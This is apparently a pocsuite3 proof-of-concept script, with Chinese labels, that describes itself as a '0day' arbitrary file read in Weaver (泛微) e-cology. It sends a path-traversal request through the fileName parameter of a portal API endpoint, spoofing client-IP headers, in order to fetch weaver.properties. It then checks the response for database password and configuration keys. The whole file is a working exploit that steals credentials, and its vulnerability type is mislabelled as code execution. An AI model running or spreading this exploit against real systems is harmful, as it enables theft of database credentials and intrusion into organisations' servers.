from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict

class TestPOC(POCBase):
    vulID = '123'  # ssvid
    version = '1.0'
    name = '泛微0day 任意文件读取'
    appName = '泛微0day 任意文件读取'
    appVersion = '不详'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''可直接读取数据库账号密码'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):
        result = {}
        headers = {"X-Forwarded-For": "127.0.0.1",
                   "X-Originating": "127.0.0.1",
                   "X-Remote-IP": "127.0.0.1",
                   "X-Remote-Addr": "127.0.0.1",
                   "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0"
                   }
        path = '/api/portalTsLogin/utils/getE9DevelopAllNameValue2?fileName=portaldev_%2f%2e%2e%2fweaver%2eproperties'
        vul_url = self.url+path
        try:
            resp = requests.get(url=vul_url, verify = False, allow_redirects = False,headers=headers, timeout =4)
            if resp.status_code == 200 and 'ecology.password' in resp.text and 'ecology.charset' in resp.text and 'ecology.maxidletime' in resp.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = vul_url
            return self.parse_output(result)
        except:
            pass

    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(TestPOC)
